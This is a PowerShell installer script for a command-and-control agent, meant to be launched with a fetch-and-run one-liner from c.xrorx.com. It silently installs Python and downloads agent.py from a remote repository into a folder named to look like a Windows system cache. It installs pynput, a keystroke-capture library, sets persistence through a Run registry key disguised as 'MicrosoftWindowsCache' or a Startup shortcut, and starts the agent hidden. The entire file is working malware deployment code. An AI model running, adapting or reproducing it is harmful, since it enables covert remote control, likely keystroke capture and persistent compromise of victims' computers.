<#
.SYNOPSIS
    C2 Node Agent installer (debug logging ON for testing)

.EXAMPLE
    irm c.xrorx.com|iex
    iex (iwr -useb c.xrorx.com).Content
#>

$ErrorActionPreference = "Continue"
$ProgressPreference = "SilentlyContinue"

$InstallPath = "$env:LOCALAPPDATA\Microsoft\Windows\SystemCache"

function Write-Info([string]$msg) { Write-Host "[*] $msg" -ForegroundColor Cyan }
function Write-Ok([string]$msg)   { Write-Host "[+] $msg" -ForegroundColor Green }
function Write-ErrLog([string]$msg) { Write-Host "[-] ERROR: $msg" -ForegroundColor Red }

function Refresh-Path {
    $machine = [System.Environment]::GetEnvironmentVariable("Path", "Machine")
    $user = [System.Environment]::GetEnvironmentVariable("Path", "User")
    $env:Path = @($machine, $user) -join ";"
}

function Find-Python {
    Refresh-Path
    foreach ($cmd in @("python", "python3", "py")) {
        $c = Get-Command $cmd -ErrorAction SilentlyContinue
        if (-not $c) { continue }
        try {
            if ($cmd -eq "py") {
                $out = & py -3 -c "import sys; print(sys.executable)" 2>$null
            } else {
                $out = & $c.Source -c "import sys; print(sys.executable)" 2>$null
            }
            if ($out -and (Test-Path $out.Trim())) {
                return $out.Trim()
            }
        } catch {}
    }
    $candidates = @(
        "$env:LOCALAPPDATA\Programs\Python\Python312\python.exe",
        "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe",
        "$env:ProgramFiles\Python312\python.exe",
        "$env:ProgramFiles\Python311\python.exe"
    )
    foreach ($p in $candidates) {
        if (Test-Path $p) { return $p }
    }
    return $null
}

Write-Host "..."
Write-Info "Install path: $InstallPath"

try {
    Write-Info "Stopping old agent processes (if any)..."
    $procs = Get-WmiObject Win32_Process -ErrorAction SilentlyContinue | Where-Object {
        ($_.Name -eq "python.exe" -or $_.Name -eq "pythonw.exe") -and
        ($_.CommandLine -like "*agent.py*")
    }
    foreach ($p in @($procs)) {
        Write-Info "Killing PID $($p.ProcessId)"
        Stop-Process -Id $p.ProcessId -Force -ErrorAction SilentlyContinue
    }

    Get-ScheduledTask -ErrorAction SilentlyContinue |
        Where-Object { $_.TaskName -like "*C2Agent*" } |
        Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue

    Write-Info "Looking for Python..."
    $pythonPath = Find-Python

    if (-not $pythonPath) {
        Write-Info "Python not found. Trying winget install Python.Python.3.12..."
        try {
            winget install Python.Python.3.12 `
                --accept-source-agreements `
                --accept-package-agreements `
                --silent `
                --disable-interactivity
            Start-Sleep -Seconds 3
            $pythonPath = Find-Python
        } catch {
            Write-ErrLog "winget install failed: $($_.Exception.Message)"
        }
    }

    if (-not $pythonPath) {
        Write-ErrLog "Python not found after winget. Install Python 3 manually and re-run."
        Write-Host "[1]"
        return
    }
    Write-Ok "Python: $pythonPath"

    $pythonDir = Split-Path $pythonPath
    $pythonwPath = Join-Path $pythonDir "pythonw.exe"
    if (-not (Test-Path $pythonwPath)) { $pythonwPath = $pythonPath }

    if (-not (Test-Path $InstallPath)) {
        New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null
        Write-Info "Created $InstallPath"
    }

    $agentPyPath = Join-Path $InstallPath "agent.py"
    $downloadUrl = "https://raw.githubusercontent.com/zen-zecode/c2/main/node/agent.py"
    Write-Info "Downloading agent.py from $downloadUrl"
    try {
        Invoke-WebRequest -Uri $downloadUrl -OutFile $agentPyPath -UseBasicParsing
    } catch {
        Write-ErrLog "Download failed: $($_.Exception.Message)"
        Write-Host "[2]"
        return
    }
    if (-not (Test-Path $agentPyPath) -or (Get-Item $agentPyPath).Length -lt 1000) {
        Write-ErrLog "agent.py missing or too small after download"
        Write-Host "[2]"
        return
    }
    Write-Ok "agent.py saved ($((Get-Item $agentPyPath).Length) bytes)"

    $venvPath = Join-Path $InstallPath "venv"
    $pyvenvCfg = Join-Path $venvPath "pyvenv.cfg"
    if (-not (Test-Path $pyvenvCfg)) {
        Write-Info "Creating venv at $venvPath"
        if (Test-Path $venvPath) {
            Remove-Item $venvPath -Recurse -Force -ErrorAction SilentlyContinue
        }
        $venvOut = & $pythonPath -m venv $venvPath 2>&1 | Out-String
        if ($venvOut) { Write-Host $venvOut }
    } else {
        Write-Info "Reusing existing venv"
    }
    if (-not (Test-Path $pyvenvCfg)) {
        Write-ErrLog "venv creation failed (pyvenv.cfg missing)"
        Write-Host "[3]"
        return
    }

    $venvPython = Join-Path $venvPath "Scripts\python.exe"
    $venvPythonw = Join-Path $venvPath "Scripts\pythonw.exe"
    if (-not (Test-Path $venvPythonw)) { $venvPythonw = $venvPython }
    if (-not (Test-Path $venvPython)) {
        Write-ErrLog "venv python missing: $venvPython"
        Write-Host "[3]"
        return
    }
    Write-Ok "venv python: $venvPython"

    $reqFile = Join-Path $InstallPath "requirements.txt"
    @"
httpx>=0.27.0
pynput>=1.7.0
"@ | Set-Content -Path $reqFile -Encoding UTF8

    Write-Info "Installing pip deps (httpx, pynput)..."
    $pipOut = & $venvPython -m pip install --upgrade pip --disable-pip-version-check 2>&1 | Out-String
    $pipOut2 = & $venvPython -m pip install -r $reqFile --disable-pip-version-check 2>&1 | Out-String
    if ($pipOut2) { Write-Host $pipOut2 }

    $importOut = & $venvPython -c "import httpx; print('httpx', httpx.__version__)" 2>&1 | Out-String
    Write-Host $importOut
    if ($LASTEXITCODE -ne 0) {
        Write-ErrLog "httpx import failed (deps not installed)"
        Write-Host "[4]"
        return
    }
    Write-Ok "Dependencies OK"

    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $name = "MicrosoftWindowsCache"
    $cmd = "cmd /c cd /d `"$venvPath`" && `"$venvPythonw`" `"$agentPyPath`""
    Write-Info "Setting persistence: $regPath\$name"
    try {
        Set-ItemProperty -Path $regPath -Name $name -Value $cmd -ErrorAction Stop
        Write-Ok "HKCU Run key set"
    } catch {
        Write-ErrLog "Registry failed: $($_.Exception.Message) — using Startup folder"
        $shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\C2Update.lnk"
        $wsh = New-Object -ComObject WScript.Shell
        $sh = $wsh.CreateShortcut($shortcutPath)
        $sh.TargetPath = "cmd.exe"
        $sh.Arguments = "/c cd /d `"$venvPath`" && `"$venvPythonw`" `"$agentPyPath`""
        $sh.WindowStyle = 7
        $sh.Save()
        Write-Ok "Startup shortcut: $shortcutPath"
    }

    $outLog = Join-Path $InstallPath "agent.out.log"
    $errLog = Join-Path $InstallPath "agent.err.log"
    Write-Info "Starting agent..."
    $proc = Start-Process -FilePath $venvPython -ArgumentList "`"$agentPyPath`"" `
        -WorkingDirectory $venvPath -WindowStyle Hidden -PassThru `
        -RedirectStandardOutput $outLog -RedirectStandardError $errLog
    Start-Sleep -Seconds 4

    if (-not $proc) {
        Write-ErrLog "Start-Process returned nothing"
        Write-Host "[5]"
        return
    }
    if ($proc.HasExited) {
        Write-ErrLog "Agent exited immediately (code $($proc.ExitCode))"
        if (Test-Path $errLog) {
            Write-Host "--- agent.err.log ---" -ForegroundColor Yellow
            Get-Content $errLog -ErrorAction SilentlyContinue | Write-Host
        }
        if (Test-Path $outLog) {
            Write-Host "--- agent.out.log ---" -ForegroundColor Yellow
            Get-Content $outLog -ErrorAction SilentlyContinue | Write-Host
        }
        Write-Host "[5]"
        return
    }

    Write-Ok "Agent running (PID $($proc.Id))"
} catch {
    Write-ErrLog $_.Exception.Message
    Write-Host $_.ScriptStackTrace -ForegroundColor DarkGray
    Write-Host "[0]"
    return
}

Write-Host "[]"
Write-Ok "Done. Check dashboard for this hostname in ~10s."
